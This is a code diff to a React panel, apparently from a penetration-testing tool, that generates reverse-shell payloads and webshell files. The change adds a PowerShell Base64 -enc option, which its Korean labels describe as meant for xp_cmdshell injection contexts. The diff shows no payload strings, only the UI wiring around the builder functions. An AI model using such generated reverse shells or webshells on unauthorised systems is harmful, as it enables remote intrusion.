@@ -1,7 +1,8 @@
 import { useState } from "react";
 import {
-  SHELL_PAYLOAD_KINDS, WEBSHELL_FILE_KINDS, buildReverseShellPayload,
-  buildWebshellFile, type ShellPayloadKind, type WebshellFileKind,
+  SHELL_PAYLOAD_KINDS, WEBSHELL_FILE_KINDS, buildPowerShellEncodedPayload,
+  buildReverseShellPayload, buildWebshellFile, type ShellPayloadKind,
+  type WebshellFileKind,
 } from "./reverseShellPayloads";
 
 // A raw nc/webshell reverse shell has no job control, no tab completion,
@@ -27,10 +28,13 @@ export default function ReverseShellPanel({ onStartListener }: {
   const [lport, setLport] = useState("443");
   const [kind, setKind] = useState<ShellPayloadKind>("nc-mkfifo");
   const [urlEncode, setUrlEncode] = useState(false);
+  const [psEncode, setPsEncode] = useState(false);
   const [webshellKind, setWebshellKind] = useState<WebshellFileKind>("php");
 
   const payload = lhost.trim() && lport.trim()
-    ? buildReverseShellPayload(kind, lhost.trim(), lport.trim())
+    ? kind === "powershell" && psEncode
+      ? buildPowerShellEncodedPayload(lhost.trim(), lport.trim())
+      : buildReverseShellPayload(kind, lhost.trim(), lport.trim())
     : "";
   const display = urlEncode ? encodeURIComponent(payload) : payload;
 
@@ -72,6 +76,13 @@ export default function ReverseShellPanel({ onStartListener }: {
           onChange={(e) => setUrlEncode(e.target.checked)} />
         URL 인코딩 (GET 파라미터에 바로 붙여넣기용)
       </label>
+      {kind === "powershell" && (
+        <label className="revshellEncode">
+          <input type="checkbox" checked={psEncode}
+            onChange={(e) => setPsEncode(e.target.checked)} />
+          PowerShell -enc(Base64)로 인코딩 (xp_cmdshell 등 따옴표 중첩 상황에 사용)
+        </label>
+      )}
       {payload && <code className="revshellPayload">{display}</code>}
       <div className="netexecCredForm">
         <select value={webshellKind}
